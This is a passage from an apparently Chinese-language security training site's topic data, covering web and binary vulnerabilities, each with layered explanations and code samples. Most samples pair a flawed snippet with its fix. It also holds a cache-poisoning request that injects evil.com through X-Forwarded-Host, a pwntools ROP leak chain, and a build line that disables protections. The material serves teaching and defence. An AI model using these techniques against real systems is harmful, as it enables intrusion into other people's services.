          refs: "OWASP GraphQL Cheat Sheet；GraphQL 官方安全指南"
        },
        {
          id: "cache-poison", name: "缓存投毒", level: "中级",
          summary: "利用 Web 缓存（CDN/反向代理）对未键输入的处理缺陷，将恶意响应缓存并投送给所有用户。",
          keywords: ["缓存投毒","cache poisoning","web cache","unkeyed","x-cache","cdn","投毒"],
          levels: {
            "入门": "网站常用缓存加速。如果缓存把某些请求头当成了区分不同用户的依据，攻击者就可能让缓存存下一份带毒的页面，发给之后所有访客。",
            "初级": "核心：缓存键（Cache Key）通常只含少数字段（Host、Path），而响应却受其他头（如 X-Forwarded-Host、User-Agent）影响但未被纳入键。攻击者在未键头里注入恶意内容（如 XSS payload 到页面），缓存后污染全体用户。",
            "中级": "实战：找 unkeyed 头（用 Param Miner 探测）；注入到反射处（如 base href、重定向）；使响应被缓存（状态 200、含 Cache-Control）。可结合 DOM XSS 实现稳定利用。防御：把所有影响响应的输入纳入缓存键，或规范化与剥离危险头。",
            "高级": "深入：缓存键规范化差异（不同 CDN 对头的处理）、缓存投毒到存储型 XSS、以及利用重定向链投毒。防御底线：绝不让未纳入缓存键的用户输入出现在响应体中。"
          },
          codeLang: "http",
          code:
`GET /en HTTP/1.1
Host: victim.com
X-Forwarded-Host: evil.com     # 未纳入缓存键，但被页面 base href 使用

# 响应被缓存后，所有用户访问 /en 都会加载 evil.com 的资源`,
          tool: "Burp Suite + Param Miner；被测目标需经 CDN/反向代理",
          refs: "PortSwigger Web Cache Poisoning；Web 缓存欺骗"
        },
        {
          id: "web-http-flow", name: "Web 应用是怎么跑起来的", level: "入门",
          summary: "浏览器发请求、服务器出响应、前端渲染——理解这条链路是理解一切 Web 漏洞的前提。",
          keywords: ["http","请求响应","前端","后端","cookie","会话"],
          levels: {
            "入门": "打开网页时，浏览器向服务器要东西（请求），服务器把内容送回来（响应），浏览器再画到屏幕上。看懂这条来回的链路，后面所有漏洞都容易理解。",
            "初级": "一次请求包含：方法（GET/POST）、路径、请求头（Cookie、User-Agent）、请求体；响应包含状态码、响应头（Set-Cookie、Content-Type）与响应体。会话靠 Cookie/Token 维持。",
            "中级": "实战关注点：参数怎么进后端、Cookie 是否 HttpOnly/Secure/SameSite、是否有 CSRF 防护、错误信息是否泄露内部细节。用浏览器开发者工具就能看全这些。",
            "高级": "深入要理解同源策略、CORS 预检、缓存与代理链路，以及「前后端分离」后鉴权放在哪一层——很多越权问题都源于把校验放在前端。",
          },
          codeLang: "text",
          code:
`一次登录请求（示意）
POST /login HTTP/1.1
Host: example.com
Content-Type: application/json
{"user":"alice","pass":"•••"}

HTTP/1.1 200 OK
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax`,
          tool: "浏览器开发者工具、curl",
          refs: "HTTP 基础；OWASP Web 安全基础"
        },
        {
          id: "web-owasp10", name: "OWASP Top 10 速览", level: "入门",
          summary: "业界公认的十大 Web 风险清单，是了解 Web 安全的最快入口，也是面试与评审的共同语言。",
          keywords: ["owasp","top10","风险清单","注入","越权","配置错误"],
          levels: {
            "入门": "OWASP Top 10 是「最常见的十类网站问题」清单，像体检报告的常见病目录。先认识它们，再逐个深入。",
            "初级": "典型项：访问控制失效（越权）、加密失败、注入、不安全设计、安全配置错误、脆弱组件、认证与会话缺陷、数据完整性失败、日志与监控不足、以及 SSRF。",
            "中级": "实战用途：评估时按清单逐项自问「我们有没有这个问题」，比零散测试更容易查出遗漏；报告里用清单编号对齐，沟通效率更高。",
            "高级": "深入：Top 10 是「高频」而非「全部」，不能替代系统性威胁建模；很多严重问题（业务逻辑、供应链）在清单之外。",
          },
          codeLang: "text",
          code:
`Top 10 快速自问（示例）
· 越权：改一个 id 能看到别人的数据吗？
· 注入：用户输入能否改变查询/命令语义？
· 配置：默认口令、目录列表、调试接口是否开着？
· 组件：有没有已知高危版本的依赖？`,
          tool: "OWASP 官网、检查清单",
          refs: "OWASP Top 10"
        },
        {
          id: "web-api-sec", name: "API 安全基础", level: "初级",
          summary: "现代应用的数据都在 API 上：鉴权、限流、参数校验与对象级授权缺一不可。",
          keywords: ["api","鉴权","限流","对象级授权","参数校验","批量"],
          levels: {
            "入门": "App 与网页的数据都来自接口（API）。接口如果只判断「你登录了吗」而不判断「这条数据是不是你的」，就会出现越权。",
            "初级": "关注点：认证（令牌是否有效）、授权（能否访问该对象）、输入校验（参数类型与范围）、限流（防枚举与刷取）、以及错误信息（别泄露内部细节）。",
            "中级": "实战：逐个接口做「换一个 id 能否访问他人数据」的验证；检查是否可批量枚举（手机号/订单号）；确认是否有频率限制。",
            "高级": "深入：把授权下沉到数据层（行级权限），接口只做转发；对敏感操作加二次校验与审计；旧版本 API 常是遗漏点。",
          },
          codeLang: "text",
          code:
`接口检查清单
□ 认证：无令牌是否被拒绝？
□ 对象级授权：换 id 能否读他人数据？
□ 限流：同接口高频调用是否被拦？
□ 参数校验：非法类型/超长是否被拒？
□ 错误信息：是否泄露内部路径与堆栈？`,
          tool: "Burp Suite、Postman、接口文档",
          refs: "OWASP API Security Top 10"
        },
        {
          id: "web-authn", name: "认证与会话管理", level: "中级",
          summary: "登录环节的问题最致命：弱口令策略、会话固定、令牌泄露与找回流程都是高发点。",
          keywords: ["认证","会话","会话固定","令牌","mfa","找回密码"],
          levels: {
            "入门": "登录就是「证明你是你」。登录后服务器给你一个凭证（Cookie/令牌），之后靠它认人。",
            "初级": "关键点：口令策略与限速、登录失败不泄露「账号是否存在」、会话在登录后重新生成（防会话固定）、Cookie 设置 HttpOnly/Secure/SameSite。",
            "中级": "实战：检查找回密码流程（能否枚举用户、令牌是否可猜、是否可绕过）、多设备会话能否单独注销、以及令牌有效期与刷新策略。",
            "高级": "深入：推广多因素认证与风控（异常登录挑战）、令牌绑定设备指纹、以及单点登录（SSO）配置错误带来的越权（如未校验签名的断言）。",
          },
          codeLang: "text",
          code:
`认证检查要点
· 登录失败信息是否统一（不暴露账号是否存在）
· 登录成功后是否重新生成会话 ID（防固定）
· 找回密码令牌是否随机、一次性、有时效
· Cookie：HttpOnly + Secure + SameSite
· 是否支持多因素与异常登录挑战`,
          tool: "Burp Suite、认证测试用例",
          refs: "OWASP 认证备忘单"
        },
        {
          id: "web-upload", name: "文件上传安全", level: "中级",
          summary: "上传是「把外部内容放进系统」：类型校验、存储隔离与执行权限，任何一环缺失都可能变成拿下服务器。",
          keywords: ["文件上传","webshell","类型校验","存储隔离","执行权限"],
          levels: {
            "入门": "上传功能如果让文件能被当成程序执行，攻击者就能上传一段代码并运行它，直接控制服务器。",
            "初级": "防线：白名单校验类型（不靠扩展名，要看内容与真实类型）、限制大小、随机化文件名、把文件存到不可执行的位置或对象存储。",
            "中级": "实战：测试思路包括改扩展名/双扩展名、伪造 Content-Type、绕过路径（../）、以及通过图片解析库触发的漏洞（图片马）。",
            "高级": "深入：纵深防御——存储与应用分离（对象存储 + 签名 URL）、上传后重命名与内容重整、下载走受控接口；并注意解析库本身的漏洞。",
          },
          codeLang: "text",
          code:
`上传安全设计
✓ 白名单：仅允许必要类型（按内容判定）
✓ 改名：服务端生成随机文件名，丢弃原扩展名
✓ 隔离：存到不可执行位置（对象存储）或独立域名
✓ 限制：大小、频率、数量
✗ 用原始文件名 + 可执行目录`,
          tool: "Burp Suite、文件类型检测库",
          refs: "OWASP 文件上传备忘单"
        },
        {
          id: "web-ssrf", name: "SSRF 原理与防御", level: "中级",
          summary: "让服务器替你去访问地址，就能打到内网与云元数据；防御靠白名单与网络隔离。",
          keywords: ["ssrf","内网探测","元数据","白名单","重定向"],
          levels: {
            "入门": "有一类功能会让服务器「替你去取一个地址」（如生成图片、抓取网页）。攻击者把地址改成内网地址，就能让服务器去访问它本来访问不到的地方。",
            "初级": "危害：探测内网端口与服务、读取云元数据获取临时凭证、访问内部管理接口；常见入口是「URL 参数」类功能。",
            "中级": "实战：测试时关注能否访问 127.0.0.1、内网网段、云元数据地址；注意重定向（先给正常地址再跳转到内网）与 DNS 解析绕过（DNS 重绑定）。",
            "高级": "深入：防御要组合——目标地址白名单、解析后校验 IP 并禁止内网段、禁用不必要协议、出网走代理并审计；云侧强制 IMDSv2 降低元数据风险。",
          },
          codeLang: "text",
          code:
`SSRF 防御要点
1) 白名单：只允许必要域名/IP
2) 解析后校验：DNS 解析完成再判断是否为内网地址
3) 禁重定向：或对每一跳重新校验
4) 出网代理：统一出口 + 审计
5) 云侧：强制 IMDSv2，限制跳数`,
          tool: "Burp Suite、出网代理",
          refs: "OWASP SSRF 防御备忘单"
        },
      ]
    },

    /* ---------------- 二进制漏洞 ---------------- */
    {
      id: "binary", name: "二进制漏洞", icon: "🔧",
      desc: "从内存破坏到利用原语，理解程序底层安全机制（栈/堆/格式化/ROP）。",
      topics: [
        {
          id: "stack", name: "栈溢出基础", level: "入门",
          summary: "缓冲区写入越界覆盖返回地址，控制执行流。",
          keywords: ["栈溢出","stack overflow","缓冲区溢出","buffer overflow","返回地址","ret","shellcode","pwntools","溢出"],
          levels: {
            "入门": "程序在栈上开了一小块空间存你的输入，但没限制长度。你输入超长内容，就会盖住旁边的「返回地址」——这告诉程序执行完去哪。改掉它，就能把流程引到你指定的地方。",
            "初级": "经典栈溢出：覆盖 saved RIP/EBP 实现控制流劫持。利用前提：关闭保护（或绕过）后植入 shellcode，或直接跳到已有有用指令（如 system）。工具：pwntools 编写 exp，gdb/pwndbg 调试。",
            "中级": "绕过保护：DEP/NX（不可执行栈）→ ROP；ASLR（地址随机）→ 信息泄漏 + 爆破/偏移；Stack Canary（栈保护）→ 逐字节泄漏。掌握 32/64 位调用约定差异。",
            "高级": "结合泄漏构造稳定 ROP 链、Stack Pivot、绕过 Full RELRO，以及在现代编译选项下评估可利用性。理解「利用原语」与「控制流完整性（CFI）」对抗。"
          },
          codeLang: "c",
          code:
`// ❌ 危险：无边界检查（教学示例，编译请加栈保护以观察防护）
void vuln(char *s){
  char buf[16];
  strcpy(buf, s);   // 越界写入可覆盖返回地址
}
// ✅ 安全：限定长度
void safe(char *s){
  char buf[16];
  strncpy(buf, s, sizeof(buf)-1);
  buf[sizeof(buf)-1]=0;
}`,
          tool: "pwntools、GDB + pwndbg、objdump、checksec",
          refs: "《CTF 竞赛权威指南》；pwntools 文档；LiveOverflow 视频"
        },
        {
          id: "heap", name: "堆溢出与堆利用", level: "高级",
          summary: "利用堆管理器（ptmalloc）元数据实现任意写/释放利用。",
          keywords: ["堆溢出","heap","堆利用","ptmalloc","unlink","use after free","double free","tcache","fastbin","堆"],
          levels: {
            "入门": "除了栈，程序还在「堆」上动态申请内存。堆管理器用一些隐藏的「记账信息」管理空闲块。如果能改这些记账信息，就可能骗它把内存写到你指定的地方。",
            "初级": "ptmalloc 基础：chunk 结构、bins（fastbin/smallbin/largebin/tcache）、top chunk。常见利用：溢出改相邻 chunk 的 size、free 后重用。",
            "中级": "经典手法：unlink、double free、tcache poisoning、fastbin attack、off-by-one。需要精确控制堆布局（heap feng shui）。",
            "高级": "结合 House of 系列（Einherjar/Force/Orange）、IO_FILE 利用、以及 tcache 在现代 glibc 下的细节。强调：堆利用高度依赖 libc 版本，需 leak + 版本匹配。"
          },
          codeLang: "c",
          code:
`// ❌ 危险：堆块越界写（示意）
char *a = malloc(0x20); char *b = malloc(0x20);
read(0, a, 0x40);   // 多写的内容覆盖了 b 的元数据
// ✅ 安全：严格按分配大小读写，并使用 sized 读取接口
read(0, a, 0x20);`,
          tool: "pwndbg、libc-database、one_gadget、HeapInspect",
          refs: "glibc malloc 源码；how2heap 仓库"
        },
        {
          id: "fmt", name: "格式化字符串漏洞", level: "中级",
          summary: "format 参数可控导致任意读/写内存。",
          keywords: ["格式化字符串","format string","%x","%n","printf","任意读","任意写","fmtstr"],
          levels: {
            "入门": "打印函数（如 printf）把你的输入当成「格式」来解析。你可以用 %x 让它把栈上的内容打印出来，用 %n 让它把数字写到某个地址——这就成了读/写内存的钥匙。",
            "初级": "原理：printf(user_str) 时 user_str 含 %x/%p 会泄露栈，%n 写入。利用：泄漏栈/内存定位、写 GOT 劫持流程。",
            "中级": "任意写：用多个 %hn 分字节写目标地址（如改返回地址或 GOT 为 system）。处理宽度与位置（$ 操作符）精确寻址。",
            "高级": "在 PIE/RELRO 下仍需泄漏基址；理解现代编译器对格式字符串的静态检查与缓解，以及如何在审计中发现此类问题。"
          },
          codeLang: "c",
          code:
`// ❌ 危险：格式串来自用户输入
printf(user_input);
// ✅ 安全：固定格式
printf("%s", user_input);`,
          tool: "pwntools(fmtstr_payload)、pwndbg",
          refs: "《格式化字符串漏洞利用》；CTF wiki"
        },
        {
          id: "rop", name: "ROP 与漏洞利用缓解", level: "高级",
          summary: "面向返回编程绕过 NX，串联 gadgets 构造利用链。",
          keywords: ["rop","返回导向编程","gadget","nx","dep","aslr","canary","ret2libc","ret2syscall","缓解"],
          levels: {
            "入门": "当数据区不可执行（NX）时，不能放 shellcode。但可以「借用」程序里已经存在的零碎指令（gadget），像拼积木一样拼出一系列操作，最终调用系统函数。",
            "初级": "ret2libc（泄漏 libc + 调用 system）、ret2syscall（拼出 execve 系统调用）、ret2plt。需要 ROPgadget/ROPGadget 找 gadget。",
            "中级": "绕过 ASLR（泄漏地址）、绕过 canary（泄漏/不触碰）、绕过 PIE。构造稳定链并处理栈对齐（movaps 陷阱）。",
            "高级": "SROP、栈迁移（stack pivot）、以及理解 CFI/Shadow Call Stack/CET（硬件缓解）对 ROP 的对抗。评估真实可利用性而非仅理论。"
          },
          codeLang: "python",
          code:
`# pwntools 构造 ROP 链（示意，靶机环境）
from pwn import *
elf = ELF('./pwn')
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])   # 泄漏 libc
rop.call('main')                       # 回到主函数复用
raw_rop = rop.chain()`,
          tool: "ROPgadget、pwntools、checksec",
          refs: "《ROP 实战》；CTF wiki ROP 章节"
        },
        {
          id: "intovf", name: "整数溢出", level: "中级",
          summary: "整数运算回绕导致长度/索引校验失效。",
          keywords: ["整数溢出","integer overflow","回绕","wrap","符号错误","截断","size_t","长度校验"],
          levels: {
            "入门": "数字在电脑里有最大值，超过就「绕回」到很小或负数。如果程序用这个数做长度判断，绕回后可能绕过限制，造成后续缓冲区出问题。",
            "初级": "场景：size 计算回绕使 malloc 过小、有符号比较误判、截断（32→16 位）。常是「其他漏洞的引信」，而非独立利用。",
            "中级": "审计：乘法分配前的溢出、无符号回绕、数组索引越界。结合符号分析定位。",
            "高级": "在编译期/静态分析层面识别，并理解语言差异（C 未定义行为 vs Rust 默认 panic）。"
          },
          codeLang: "c",
          code:
`// ❌ 危险：乘法溢出（示意）
size_t n = count * sizeof(item);  // count 很大时回绕
buf = malloc(n);
// ✅ 安全：先检查再分配
if (count > MAX/sizeof(item)) return ERR;`,
          tool: "Fuzzer（AFL++）、静态分析（CodeQL）",
          refs: "CWE-190；Integer Overflow 指南"
        },
        {
          id: "race", name: "条件竞争 Race Condition", level: "中级",
          summary: "并发下「检查」与「使用」的竞态（TOCTOU）导致越权/超支。",
          keywords: ["条件竞争","race condition","竞态","toctou","并发","竞争","race","并发漏洞"],
          levels: {
            "入门": "程序有时先「检查」再做「操作」。如果检查和操作之间，另一个请求偷偷改了状态，就可能绕过检查。比如先查「余额够不够」，再扣款，中间被人并发抢先花掉，就超支了。",
            "初级": "典型：抽奖/优惠券/转账的金额竞态、文件上传与处理的 TOCTOU、权限检查与执行的间隙。利用：并发重放同一请求（Burp Intruder 多线程）。防御：原子操作、加锁、数据库事务隔离。",
            "中级": "实战：并行发送大量请求打到「检查通过但还没扣减」的窗口；利用无锁的计数、最后写入胜出。CTF 中常见于赠送/兑换逻辑。",
            "高级": "深入内核级竞态（double-fetch）、CPU 乱序与内存模型、以及如何在语言/框架层用乐观锁/悲观锁根治。竞态是「时序」问题，单线程测试永远发现不了。"
          },
          codeLang: "python",
          code:
`# ✅ 用数据库事务+行锁保证「检查与扣减」原子
with conn.begin():
    row = cur.execute("SELECT balance FROM acc WHERE id=%s FOR UPDATE", (uid,))
    if row.balance < amt: raise Error("insufficient")
    cur.execute("UPDATE acc SET balance=balance-%s WHERE id=%s", (amt, uid))`,
          tool: "Burp Intruder（多线程）、Turbo Intruder、race 脚本（授权）",
          refs: "OWASP Race Condition；CTF wiki"
        },
        {
          id: "fuzz", name: "模糊测试 Fuzzing", level: "初级",
          summary: "用模糊测试自动生成畸形输入，触发崩溃与漏洞。",
          keywords: ["fuzzing","模糊测试","fuzz","afl","afl++","覆盖率","崩溃","变异"],
          levels: {
            "入门": "与其手工想 payload，不如让程序自动生成海量随机/变异输入喂给目标，看它会不会崩。崩了往往意味着有内存破坏或解析缺陷。这是发现 0day 的主力方法之一。",
            "初级": "两类：dumb fuzzing（纯随机）与 coverage-guided（AFL++ 据代码覆盖率变异，效率高）。流程：选目标接口/解析器 → 喂变异输入 → 监控崩溃 → 复现分析。防御侧用它做健壮性测试。",
            "中级": "进阶：语料库种子、字典引导、持久模式（persistent mode）提速、崩溃去重（triaging）。结合 sanitizer（ASan/UBSan）定位根因。CTF 中常用于挖 binary 题的解析 bug。",
            "高级": "结构性 fuzzing（按语法生成输入）、内核/浏览器 fuzzing、以及将 fuzzing 纳入 CI 作为持续安全门禁。fuzzing 是「工程化发现」而非「理论分析」。"
          },
          codeLang: "bash",
          code:
`# ✅ 用 AFL++ 做覆盖率引导的模糊测试（本地解析器）
afl-fuzz -i in/ -o out/ -- ./parser @@
# 配合 AddressSanitizer 编译以捕获内存错误
clang -fsanitize=address -g parser.c -o parser`,
          tool: "AFL++、libFuzzer、Sanitizer（ASan/UBSan）",
          refs: "AFL++ 文档；Google Fuzzing 教程"
        },
        {
          id: "sandbox", name: "沙箱与系统调用过滤", level: "高级",
          summary: "理解沙箱/系统调用过滤（seccomp）及常见逃逸思路。",
          keywords: ["沙箱逃逸","sandbox","seccomp","系统调用","命名空间","容器逃逸","特权","capabilities"],
          levels: {
            "入门": "很多程序运行在「沙箱」里，被限制能调用的系统调用、能访问的文件。沙箱逃逸就是想办法突破这层限制，拿到更多权限或读不该读的东西。",
            "初级": "常见机制：seccomp 过滤系统调用、namespace 隔离、capabilities 最小权限、chroot。逃逸点：配置错误放开了危险 syscall（如 ptrace/execve）、容器以特权运行、挂载了宿主文件系统。",
            "中级": "容器逃逸：特权容器、挂载 docker.sock、CAP_SYS_ADMIN、写入 cgroup release_agent、利用内核漏洞。与二进制利用结合（先 info leak 再提权）。",
            "高级": "深入 seccomp 过滤器绕过（bpf 误配）、用户态与内核态边界、以及现代沙箱（gVisor、Firecracker）的威胁模型。沙箱是纵深防御的一环，不是银弹。"
          },
          codeLang: "c",
          code:
`// ✅ 用 seccomp 仅放行必要系统调用（示意）
struct sock_filter filter[] = { /* 白名单 read/write/exit */ };
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
// 绝不放开 ptrace/execve/mount 等危险调用`,
          tool: "seccomp-tools、gVisor、Firecracker、容器审计",
          refs: "seccomp BPF 文档；容器安全最佳实践"
        },
        {
          id: "mitigations", name: "二进制防护机制", level: "入门",
          summary: "理解 ASLR/PIE/Canary/NX/RELRO 等缓解措施，及其绕过前提。",
          keywords: ["防护机制","mitigation","aslr","pie","canary","nx","dep","relro","checksec","栈保护","地址随机化","缓解"],
          levels: {
            "入门": "现代系统给程序加了多道「锁」：栈不可执行、地址随机化、函数返回前检查栈有没有被破坏。这些「缓解措施」让老式攻击方法失效或变难。做题/审计前先看清开了哪些锁。",
            "初级": "五大件：NX/DEP（数据区不可执行，催生 ROP）、ASLR/PIE（地址随机，需泄漏）、Stack Canary（栈溢出检测，需逐字节泄漏）、RELRO（防止 GOT 覆写，Full RELRO 彻底只读）、FORTIFY（危险函数检查）。用 checksec 一眼看清。",
            "中级": "逐项绕过思路：NX→ROP；ASLR/PIE→信息泄漏拿基址；Canary→泄漏或避开返回地址；Partial RELRO→改 GOT；FORTIFY→绕过长度检查。实战常需组合。",
            "高级": "深入硬件缓解：CET（Intel CET/Shadow Stack）、ARM PAC/BTI、Control Flow Integrity（CFI）。理解「缓解是概率与成本」，而非绝对安全；评估真实可利用性是关键。"
          },
          codeLang: "bash",
          code:
`# 用 checksec 查看程序开了哪些防护
$ checksec --file=./vuln
  Arch:     amd64
  RELRO:    Partial RELRO
  Canary:   No
  NX:       Yes
  PIE:      Yes
  ASLR:     Yes (系统级)
# 编译时控制防护（仅练习用，生产应全开）：
gcc -fno-stack-protector -z execstack -no-pie vuln.c -o vuln`,
          tool: "checksec、pwntools、gdb/pwndbg",
          refs: "《CTF 竞赛权威指南》；RELRO/Canary 文档"
        },
        {
          id: "uaf", name: "释放后使用 UAF", level: "高级",
          summary: "内存被 free 后悬垂指针仍被访问，导致类型混淆/任意读写。",
          keywords: ["uaf","use after free","释放后使用","堆","double free","悬垂指针","dangling pointer","堆利用","类型混淆"],
          levels: {
            "入门": "程序把一块内存「释放」了（不用了），但后面又去读写它。这块内存可能已被系统分配给别的数据，于是你改的就成了「别人的数据」——这就是释放后使用，是堆漏洞的经典之一。",
            "初级": "UAF = free 之后仍持有指针并访问。危害：改写被复用 chunk 的元数据或对象虚表，实现任意读写/代码执行。常见场景：C++ 对象 delete 后未置空、缓存/连接池复用。",
            "中级": "利用：通过「释放→再利用（控制 reuse 的类型）→借助悬垂指针读写」构造类型混淆（type confusion）或改虚表指针（vtable）指向攻击者数据。需要精确堆布局与版本匹配（libc/类）。",
            "高级": "深入 C++ 对象生命周期、vtable 劫持、与浏览器/内核 UAF 的共通点、以及现代缓解（隔离堆、延迟释放、CFI/VTGuard）。UAF 修复靠「释放即置空 + 所有权模型（智能指针/Rust 所有权）」。"
          },
          codeLang: "c",
          code:
`// ❌ 危险：free 后仍使用（悬垂指针）
char *buf = malloc(32);
strcpy(buf, "hello");
free(buf);
// 此时 buf 已被回收，另一处 malloc 可能复用该内存
printf("%s", buf);            // UAF：读已被复用的内存

// ✅ 安全：释放后立即置空，或改用所有权/智能指针
free(buf); buf = NULL;        // C++ 推荐 std::unique_ptr 自动管理`,
          tool: "pwndbg、libc-database、ASan（发现 UAF）",
          refs: "CWE-416；how2heap；浏览器 UAF 分析文章"
        },
        {
          id: "int-overflow", name: "整数溢出与符号错误", level: "中级",
          summary: "整数回绕、截断与符号混淆导致边界检查被绕过，常见于 C/C++ 内存安全漏洞。",
          keywords: ["整数溢出","integer overflow","符号错误","signedness","截断","回绕","cve","size_t"],
          levels: {
            "入门": "程序用数字表示长度、大小。如果数字超过它能存的最大值会绕回成小的数，安全检查就被骗过，可能分配过小的缓冲区导致溢出。",
            "初级": "类型：无符号溢出回绕（0xFFFFFFFF+1=0）、有符号溢出（未定义行为）、符号混淆（size_t 与 int 比较，负值变巨大正数）。经典利用：绕过长度校验分配小数组，后续拷贝越界。",
            "中级": "实战：审计 malloc(len+1) 类计算；注意循环变量与数组下标符号；长度用 unsigned 但比较用 signed。缓解：使用安全整数类型（uint64_t）、调用 checked 算术（__builtin_add_overflow）。",
            "高级": "深入：编译器优化对溢出假设的影响（UB 可被优化删除检查）、以及整数问题在解引用越界后的完整利用链。强调：边界检查前必须确认运算无溢出且类型一致。"
          },
          codeLang: "c",
          code:
`// ❌ 危险：len 为有符号，且未检查乘法溢出
int len = user_len;
char *buf = malloc(len * sizeof(int));   // len 为负或过大时回绕/截断

// ✅ 安全：无符号 + 溢出检查
size_t len = user_len;
if (len > MAX || __builtin_mul_overflow(len, sizeof(int), &n)) return -1;`,
          tool: "ASan/UBSan、Ghidra、fuzzer",
          refs: "CWE-190；整数溢出手册"
        },
        {
          id: "fuzzing", name: "Fuzzing 与模糊测试", level: "中级",
          summary: "用自动化生成的海量畸形输入驱动程序，结合覆盖率或崩溃反馈发现未知漏洞。",
          keywords: ["fuzzing","模糊测试","afl","libfuzzer","覆盖率","crash","sanitizer","oss-fuzz"],
          levels: {
            "入门": "与其手工找漏洞，不如写个程序自动生成大量奇怪的输入丢给目标，看它会不会崩。崩了往往意味着有 bug。",
            "初级": "两类：盲 fuzz（随机或变异，无反馈）与覆盖率引导 fuzz（AFL/AFL++、libFuzzer 根据代码覆盖调整输入）。配合 Sanitizer（ASan/UBSan）能在崩溃前捕获内存错误。搭建：把目标编译进 harness，喂种子输入。",
            "中级": "实战：写 libFuzzer 的 LLVMFuzzerTestOneInput harness；用 AFL++ 持久模式；字典与语料提升覆盖率；崩溃去重与最小化（crashwalk）。持续 fuzz 在 CI 中价值最大。",
            "高级": "深入：结构感知 fuzz（语法或协议感知）、syzkaller 对内核、以及 fuzz 与符号执行或约束求解结合（Driller）。强调：fuzzing 不是替代审计，而是规模化发现浅层但真实的内存破坏。"
          },
          codeLang: "c",
          code:
`// ✅ libFuzzer harness 示例
#include <stdint.h>
extern "C" int LLVMFuzzerTestOneInput(const uint8_t* d, size_t n){
  parse_input(d, n);   // 被测函数
  return 0;
}
// 编译：clang -fsanitize=fuzzer,address parse.c fuzz.cc`,
          tool: "AFL++、libFuzzer、OSS-Fuzz、Sanitizer",
          refs: "AFL++ 文档；libFuzzer 教程；CWE-908"
        },
        {
          id: "toctou", name: "条件竞争与 TOCTOU", level: "中级",
          summary: "在检查与使用时资源状态被并发修改，常见于文件权限、余额、兑换等场景。",
          keywords: ["条件竞争","race condition","toctou","并发","竞态","余额","兑换","锁"],
          levels: {
            "入门": "程序先检查是否允许，再使用允许的结果。如果两个请求同时进来，可能都通过了检查，然后都执行，造成重复或越权。",
            "初级": "TOCTOU（Time-of-check to time-of-use）：检查文件名存在或权限，使用时已被替换。Web 场景：并发请求兑换、转账、上传覆盖、验证码复用。危害：余额被刷、文件被改、权限被提。",
            "中级": "实战：并发重放兑换或下单请求（Burp Turbo Intruder）；文件操作中检查后替换（符号链接攻击）；无原子性的库存扣减。防御：加锁或事务、原子操作（compare-and-swap）、服务端幂等。",
            "高级": "深入：分布式下的乐观锁与悲观锁选择、数据库事务隔离级别对竞态的影响、以及符号链接加权限的本地提权链。强调：凡是先查后做都要考虑并发，优先用数据库约束保证原子性。"
          },
          codeLang: "sql",
          code:
`-- ❌ 危险：先查后扣，非原子，并发可超卖
SELECT balance FROM u WHERE id=1;     -- 假设 100
UPDATE u SET balance=balance-100 WHERE id=1;  -- 两个并发都通过查

-- ✅ 安全：单条原子更新 + 约束
UPDATE u SET balance=balance-100 WHERE id=1 AND balance>=100;`,
          tool: "Burp Turbo Intruder、race 测试脚本",
          refs: "CWE-362；并发安全设计"
        },
        {
          id: "bin-memory", name: "程序的内存长什么样", level: "入门",
          summary: "栈、堆、代码段、数据段各放什么；理解内存布局是理解溢出类漏洞的第一步。",
          keywords: ["内存布局","栈","堆","数据段","地址空间","入门"],
          levels: {
            "入门": "程序运行时，内存被分成几块：存放代码的、放全局变量的、放函数临时变量的（栈）、放动态申请的（堆）。溢出类漏洞就是「写多了，越界写到别人地盘」。",
            "初级": "典型布局：代码段（只读）、数据段（全局/静态）、堆（malloc/new 向上增长）、栈（函数调用，向下增长）。栈里存返回地址，因此被覆盖后能劫持控制流。",
            "中级": "实战：用调试器看寄存器与栈帧，观察函数调用时返回地址存在哪；理解缓冲区到返回地址之间隔着多少字节，是写利用的基础。",
            "高级": "深入：现代系统有 ASLR（地址随机化）、NX（栈不可执行）、Canary（栈保护），所以需要信息泄露 + ROP 等组合技术；理解保护机制是进阶关键。",
          },
          codeLang: "text",
          code:
`进程地址空间（简化，自低到高）
代码段   ：机器指令（只读）
数据段   ：全局/静态变量
堆   ↑   ：malloc/new 动态分配
     ↓
栈   ↓   ：函数局部变量、返回地址
（栈溢出：写超局部变量 → 覆盖返回地址）`,
          tool: "GDB、Ghidra、pwn 调试环境",
          refs: "内存布局；栈溢出入门"
        },
        {
          id: "bin-tools", name: "逆向工具入门", level: "入门",
          summary: "从 strings 到 Ghidra：先会用工具看程序，再谈分析漏洞。",
          keywords: ["逆向","ida","ghidra","objdump","strings","调试"],
          levels: {
            "入门": "逆向就是「没有源代码也要看懂程序在干什么」。入门先用几个工具：看字符串、看文件结构、用反编译器看大致逻辑。",
            "初级": "常用组合：file/strings 快速摸底、objdump/nm 看符号、Ghidra/IDA 反编译看逻辑、GDB 单步调试验证猜想。",
            "中级": "实战：先找关键字符串（错误提示、提示语）定位相关函数，再从交叉引用回溯判断条件；对加壳或混淆的样本先脱壳再分析。",
            "高级": "深入：理解编译器优化对反编译的影响（内联、尾调用）、手工恢复结构体与命名，以及用脚本（IDAPython/Ghidra Script）批量化分析。",
          },
          codeLang: "bash",
          code:
`# 逆向入门三步
file target && strings -n 6 target | head      # 1) 摸底
objdump -d target | less                        # 2) 看汇编
ghidra                                          # 3) 反编译看逻辑（GUI）`,
          tool: "Ghidra、IDA、objdump、GDB",
          refs: "逆向工程入门"
        },
        {
          id: "bin-rop", name: "ROP 与绕过保护机制", level: "高级",
          summary: "当栈不可执行时，攻击者用已有代码片段（gadget）拼出想要的逻辑；防御靠全面缓解与编译加固。",
          keywords: ["rop","gadget","aslr","nx","保护机制","绕过"],
          levels: {
            "入门": "程序里本来就有很多小代码片段，攻击者把它们像积木一样拼起来，完成自己想做的事——这就是 ROP。",
            "初级": "前置：需要控制栈与若干寄存器（通常由栈溢出提供），以及知道代码与库的地址；NX 让注入的 shellcode 无法执行，于是转向复用已有代码。",
            "中级": "实战：找 gadget（pop rdi; ret 等）→ 泄露地址绕过 ASLR → 拼出调用链；工具如 ROPgadget/pwntools 能加速。",
            "高级": "深入：现代缓解（PIE、CET、Canary 组合）大幅提高难度；从防守角度要用安全编译选项与持续更新，减少可被利用的漏洞与可用 gadget。",
          },
          codeLang: "python",
          code:
`# ROP 链思路（伪代码，教学用）
# 1) 泄露某函数真实地址 → 计算基址（绕过 ASLR）
# 2) 用 pop rdi; ret 把参数放进寄存器
# 3) 跳转到 system/execve 完成目标
